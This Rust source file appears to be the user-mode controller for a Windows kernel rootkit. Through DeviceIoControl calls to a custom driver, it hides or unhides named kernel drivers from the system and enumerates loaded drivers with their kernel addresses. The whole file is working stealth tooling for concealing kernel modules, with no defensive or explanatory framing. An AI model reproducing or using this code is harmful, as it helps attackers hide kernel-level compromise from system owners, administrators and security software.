use {
    log::{error, info, debug},
    crate::utils::open_driver,
    common::structs::{DriverInfo, TargetDriver},
    std::{ffi::c_void, ptr::null_mut},
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

/// Provides operations for managing drivers through a driver interface.
pub struct Driver {
    driver_handle: HANDLE,
}

impl Driver {
    /// Creates a new `Driver` instance, opening a handle to the driver.
    ///
    /// # Returns
    /// 
    /// * An instance of `Driver`.
    /// 
    /// # Panics
    /// 
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Driver { driver_handle }
    }
    
    /// Hides or unhides a driver based on its name.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the hide/unhide operation.
    /// * `name` - The name of the driver to hide or unhide.
    /// * `enable` - `true` to hide or `false` to unhide the driver.
    pub fn unhide_hide_driver(self, ioctl_code: u32, name: &String, enable: bool) {
        debug!("Attempting to open the driver for {} operation", if enable { "hide" } else { "unhide" });
        debug!("Preparing structure for: {}", name);
        let mut info_driver = TargetDriver {
            name: name.to_string(),
            enable,
            ..Default::default()
        };

        debug!("Sending DeviceIoControl command to {} driver", if enable { "hide" } else { "unhide" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_driver as *mut _ as *mut c_void,
                size_of::<TargetDriver>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Driver successfully {}hidden", if enable { "" } else { "un" });
        }
    }

    /// Enumerates all drivers, retrieving information about each one.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the enumeration operation.
    pub fn enumerate_driver(self, ioctl_code: u32) {
        debug!("Attempting to open the driver for enumeration");
        debug!("Allocating memory for driver info");
        let mut driver_info: [DriverInfo; 400] = unsafe { std::mem::zeroed() };

        debug!("Sending DeviceIoControl command to enumerate drivers");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                null_mut(),
                0,
                driver_info.as_mut_ptr() as *mut _,
                (driver_info.len() * size_of::<DriverInfo>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            let total_modules = return_buffer as usize / size_of::<DriverInfo>();
            info!("Total modules found: {}", total_modules);
            info!("Listing drivers:");
            println!("");

            for i in driver_info.iter() {
                if i.address > 0 {
                    let name = match String::from_utf16(&i.name) {
                        Ok(name) => name,
                        Err(err) => {
                            error!("UTF-16 decoding error: {:?}", err);
                            continue;
                        }
                    };

                    println!("[{:2}]  {:#018x}  {}", i.index, i.address, name);
                }
            }
            println!("");
            info!("Driver enumeration completed.");
        }
    }
}

impl Drop for Driver {
    /// Ensures the driver handle is closed when `Driver` goes out of scope.
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
